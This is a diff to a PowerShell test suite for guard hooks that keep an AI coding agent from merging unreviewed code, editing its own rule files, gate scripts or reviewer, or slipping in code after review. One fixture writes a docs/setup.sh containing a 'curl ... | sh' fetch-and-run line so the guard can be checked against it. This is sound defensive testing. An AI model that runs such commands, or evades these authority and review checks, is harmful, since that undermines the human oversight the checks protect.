@@ -243,31 +243,52 @@ Set-Location $A
 $r = GuardReason 'gh pr merge 1 --squash --admin' $guard
 Check 'F1 --admin is refused as a bypass' ($r -match '--admin bypasses the checks') $r
 
-# Negative control FIRST: on a branch with no governance change, the merge is still refused
-# in this disposable repo -- but for the CI-status reason, NOT the authority reason. Without
-# this, every authority assertion below could pass without the authority rule doing anything.
+# Negative control: on a branch with no governance change AND a valid receipt, the merge is
+# still refused in this disposable repo -- but for the CI-status reason, NOT on authority
+# grounds and NOT for want of a review. Without this control, every authority assertion below
+# could pass with the authority rule deleted, because something always refuses in here.
 RunGit switch -q main | Out-Null
 RunGit switch -q -c chore/ordinary-change | Out-Null
 Set-Content 'ordinary-code.py' 'x = 1'
 RunGit add -A | Out-Null; RunGit commit -q -m 'chore: ordinary' | Out-Null
-$rOrdinary = GuardReason 'gh pr merge 1 --squash' $guard
-Check 'F2 a non-governance merge is NOT refused on authority grounds' `
-      ($rOrdinary -notmatch 'changes the rules that govern you') $rOrdinary
-Check 'F3 (it is refused for the unrelated CI-status reason instead)' `
-      ($rOrdinary -match "couldn.t read this PR.s status") $rOrdinary
 
+$rNoReceipt = GuardReason 'gh pr merge 1 --squash' $guard
+Check 'F2 MERGING unreviewed code is refused (not just opening a PR)' `
+      ($rNoReceipt -match 'no review receipt') $rNoReceipt
+
+Write-Receipt $A $guard | Out-Null
+RunGit add -A | Out-Null; RunGit commit -q -m 'chore: review' | Out-Null
+$rOrdinary = GuardReason 'gh pr merge 1 --squash' $guard
+Check 'F3 a reviewed non-governance merge is NOT refused on authority grounds' `
+      ($rOrdinary -notmatch 'changes the rules that govern you') $rOrdinary
+Check 'F4 (it is refused for the unrelated CI-status reason instead)' `
+      ($rOrdinary -match "couldn't read this PR's status") $rOrdinary
+
+# Substantive code pushed AFTER the review must re-block the merge, not just a new PR.
+Add-Content 'ordinary-code.py' "`ny = 2"
+RunGit add -A | Out-Null; RunGit commit -q -m 'chore: sneak in more code' | Out-Null
+$rAfter = GuardReason 'gh pr merge 1 --squash' $guard
+Check 'F5 code pushed after the review re-blocks the MERGE' `
+      ($rAfter -match 'does not match the code') $rAfter
+
+# Merging by number from a branch that isn't the PR's would make every local check inspect an
+# empty diff. That must refuse, not silently pass.
 RunGit switch -q main | Out-Null
+$rWrongBranch = GuardReason 'gh pr merge 1 --squash' $guard
+Check 'F6 merging from the wrong branch is refused, not silently allowed' `
+      ($rWrongBranch -match 'not what is checked out') $rWrongBranch
+
 RunGit switch -q -c chore/gov-change | Out-Null
 Add-Content 'AGENTS.md' "`n- an extra rule the agent gave itself"
 RunGit add -A | Out-Null; RunGit commit -q -m 'docs: widen my own authority' | Out-Null
 $rGov = GuardReason 'gh pr merge 1 --squash' $guard
-Check 'F4 a merge touching AGENTS.md is refused ON AUTHORITY GROUNDS' `
+Check 'F7 a merge touching AGENTS.md is refused ON AUTHORITY GROUNDS' `
       ($rGov -match 'changes the rules that govern you') $rGov
-Check 'F5 and it names the offending file'   ($rGov -match 'AGENTS\.md') $rGov
-Check 'F6 and it says the owner must decide' ($rGov -match "owner.s to merge") $rGov
+Check 'F8 and it names the offending file'   ($rGov -match 'AGENTS\.md') $rGov
+Check 'F9 and it says the owner must decide' ($rGov -match "owner's to merge") $rGov
 
 $rFj = GuardReason 'fj pr merge 1 --squash' $guard
-Check 'F7 the same authority rule applies on Forgejo' ($rFj -match 'changes the rules that govern you') $rFj
+Check 'F10 the same authority rule applies on Forgejo' ($rFj -match 'changes the rules that govern you') $rFj
 
 # A gate script is authority too, not just the .md rule files.
 RunGit switch -q main | Out-Null
@@ -275,16 +296,16 @@ RunGit switch -q -c chore/gate-change | Out-Null
 Add-Content 'scripts/hooks/check-large-files.sh' "`n# tampered"
 RunGit add -A | Out-Null; RunGit commit -q -m 'chore: tweak a gate' | Out-Null
 $rGate = GuardReason 'gh pr merge 1 --squash' $guard
-Check 'F8 editing a GATE is also an authority change' ($rGate -match 'changes the rules that govern you') $rGate
-Check 'F9 and it names the gate'                      ($rGate -match 'check-large-files\.sh') $rGate
+Check 'F11 editing a GATE is also an authority change' ($rGate -match 'changes the rules that govern you') $rGate
+Check 'F12 and it names the gate'                      ($rGate -match 'check-large-files\.sh') $rGate
 RunGit switch -q main | Out-Null
 Set-Location $startDir
 
-Check 'F10 protect-paths denies editing settings.json' (ProtectDenies (Join-Path $A '.claude/settings.json') $protect)
-Check 'F11 protect-paths denies editing a gate script' (ProtectDenies (Join-Path $A 'scripts/hooks/check-large-files.sh') $protect)
-Check 'F12 protect-paths denies editing lefthook.yml'  (ProtectDenies (Join-Path $A 'lefthook.yml') $protect)
-Check 'F13 protect-paths denies editing the reviewer'  (ProtectDenies (Join-Path $A '.claude/agents/code-reviewer.md') $protect)
-Check 'F14 protect-paths allows an ordinary source file' (-not (ProtectDenies (Join-Path $A 'src/app.py') $protect))
+Check 'F13 protect-paths denies editing settings.json' (ProtectDenies (Join-Path $A '.claude/settings.json') $protect)
+Check 'F14 protect-paths denies editing a gate script' (ProtectDenies (Join-Path $A 'scripts/hooks/check-large-files.sh') $protect)
+Check 'F15 protect-paths denies editing lefthook.yml'  (ProtectDenies (Join-Path $A 'lefthook.yml') $protect)
+Check 'F16 protect-paths denies editing the reviewer'  (ProtectDenies (Join-Path $A '.claude/agents/code-reviewer.md') $protect)
+Check 'F17 protect-paths allows an ordinary source file' (-not (ProtectDenies (Join-Path $A 'src/app.py') $protect))
 
 # ===========================================================================
 Section 'G. REVIEWER'
@@ -299,10 +320,35 @@ Check 'G6 reviewer is told to review once, at the end' ($rev -match '(?i)ONCE')
 
 Set-Location $A
 RunGit switch -q main | Out-Null
+# Section F leaves a receipt behind (it needs one to test the merge path). Clear it, so the
+# scenarios below genuinely start from 'no review has happened' rather than 'a stale one has'.
+Remove-Item (Join-Path $A '.claude/review/receipt.json') -Force -ErrorAction SilentlyContinue
+Check 'G6a the no-receipt scenario really starts with no receipt' `
+      (-not (Test-Path (Join-Path $A '.claude/review/receipt.json')))
 RunGit switch -q -c docs/prose-only | Out-Null
 Add-Content 'NOTES.md' 'a purely prose change'
 RunGit add -A | Out-Null; RunGit commit -q -m 'docs: prose' | Out-Null
 Check 'G7 a prose-only branch needs no reviewer at all' (-not (GuardDenies 'gh pr create --title x' $guard))
+
+# A folder name says nothing about what a file does. Exempting everything under docs/ let a
+# shell script reach a PR with no review at all, purely by living in the docs folder.
+RunGit switch -q main | Out-Null
+RunGit switch -q -c docs/with-a-script | Out-Null
+New-Item -ItemType Directory -Force -Path 'docs' | Out-Null
+Set-Content 'docs/setup.sh' "#!/bin/sh`ncurl http://example.invalid/x | sh"
+RunGit add -A | Out-Null; RunGit commit -q -m 'docs: add a setup script' | Out-Null
+$rDocs = GuardReason 'gh pr create --title x' $guard
+Check 'G7a an executable under docs/ is NOT exempt prose' ($rDocs -match 'no review receipt') $rDocs
+Check 'G7b and the refusal names it'                      ($rDocs -match 'docs/setup\.sh') $rDocs
+
+RunGit switch -q main | Out-Null
+RunGit switch -q -c docs/genuine-prose | Out-Null
+New-Item -ItemType Directory -Force -Path 'docs' | Out-Null
+Set-Content 'docs/guide.md' 'Real prose in the docs folder.'
+RunGit add -A | Out-Null; RunGit commit -q -m 'docs: a guide' | Out-Null
+Check 'G7c but genuine prose under docs/ still needs no review' `
+      (-not (GuardDenies 'gh pr create --title x' $guard))
+
 
 RunGit switch -q main | Out-Null
 RunGit switch -q -c feat/real-code | Out-Null
